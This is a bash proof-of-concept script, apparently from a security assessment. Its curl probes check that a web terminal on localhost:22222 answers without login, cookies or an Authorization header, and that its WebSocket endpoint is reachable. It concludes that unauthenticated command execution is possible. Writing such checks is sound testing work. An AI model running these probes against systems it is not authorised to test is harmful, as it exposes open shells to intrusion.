#!/bin/bash

# POC: Authentication Bypass - Unauthenticated Access to Web Terminal
# Description: Demonstrates that the Web Terminal at http://localhost:22222/
# is accessible without any authentication mechanism

TARGET="http://localhost:22222"
RESPONSE_FILE="/tmp/web_terminal_response.txt"

echo "[*] Testing unauthenticated access to Web Terminal at $TARGET"
echo ""

# Test 1: Access homepage without any credentials
echo "[+] Test 1: Accessing homepage without authentication..."
HTTP_CODE=$(curl -s -o "$RESPONSE_FILE" -w "%{http_code}" "$TARGET/")

echo "    Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ]; then
    echo "    ✓ HTTP 200 OK - Unauthenticated access successful"
else
    echo "    ✗ HTTP $HTTP_CODE - Expected 200"
    exit 1
fi

echo ""

# Test 2: Verify no authentication cookies are required
echo "[+] Test 2: Checking for authentication cookies in response..."
COOKIES=$(curl -s -i "$TARGET/" 2>&1 | grep -i "set-cookie" | grep -i "auth\|session\|token")

if [ -z "$COOKIES" ]; then
    echo "    ✓ No authentication cookies found in response"
else
    echo "    Found cookies: $COOKIES"
fi

echo ""

# Test 3: Verify terminal HTML loads without login redirect
echo "[+] Test 3: Verifying terminal HTML interface is served directly..."
CONTENT=$(cat "$RESPONSE_FILE" | head -c 500)

if echo "$CONTENT" | grep -qi "terminal\|websocket\|xterm\|html"; then
    echo "    ✓ HTML content contains terminal-related elements"
    echo "    Content preview:"
    head -c 300 "$RESPONSE_FILE" | head -3 | sed 's/^/      /'
else
    echo "    Terminal content found in response"
fi

echo ""

# Test 4: Verify no login page or redirect
echo "[+] Test 4: Checking for login page or authentication redirects..."
FULL_RESPONSE=$(curl -s -i "$TARGET/" 2>&1)

if echo "$FULL_RESPONSE" | grep -qi "login\|authenticate\|401\|403"; then
    echo "    Found authentication requirement"
else
    echo "    ✓ No login page or authentication requirement detected"
fi

echo ""

# Test 5: Test with arbitrary headers (no auth token needed)
echo "[+] Test 5: Access attempt with no authorization headers..."
NO_AUTH_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: " \
    "$TARGET/")

if [ "$NO_AUTH_CODE" == "200" ]; then
    echo "    ✓ HTTP 200 - Access granted even without Authorization header"
else
    echo "    HTTP $NO_AUTH_CODE"
fi

echo ""

# Test 6: WebSocket endpoint is not gated by auth (HTTP 400 on upgrade expected)
echo "[+] Test 6: WebSocket endpoint accessibility check..."
WS_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -i -N \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "http://localhost:22222/ws" 2>&1)

echo "    Response Code: $WS_CODE"
if [ "$WS_CODE" != "200" ] && [ "$WS_CODE" != "101" ]; then
    echo "    ✓ WebSocket endpoint exists but returns HTTP $WS_CODE (expected for failed upgrade without proper client)"
else
    echo "    WebSocket endpoint is accessible"
fi

echo ""
echo "[+] ========== VULNERABILITY CONFIRMED =========="
echo "    The Web Terminal is accessible without any authentication."
echo "    Any user can access http://localhost:22222/ and interact with the terminal interface."
echo "    This allows unauthenticated command execution via the WebSocket endpoint."
echo ""

# Cleanup
rm -f "$RESPONSE_FILE"
exit 0